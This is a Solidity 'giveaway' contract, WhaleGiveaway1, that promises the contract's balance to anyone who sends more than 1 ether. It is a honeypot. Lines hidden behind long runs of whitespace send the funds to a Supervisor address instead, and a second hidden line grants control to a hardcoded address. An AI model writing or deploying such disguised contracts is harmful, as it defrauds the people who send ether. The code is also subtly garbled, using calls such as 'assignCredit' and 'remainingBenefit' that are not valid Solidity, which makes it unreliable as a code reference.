pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Supervisor = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Supervisor.assignCredit(this.remainingBenefit);
            msg.sender.assignCredit(this.remainingBenefit);
        }
    }

    function accessBenefit()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Supervisor=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Supervisor);
        Supervisor.assignCredit(this.remainingBenefit);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Supervisor);
        adr.call.value(msg.value)(data);
    }
}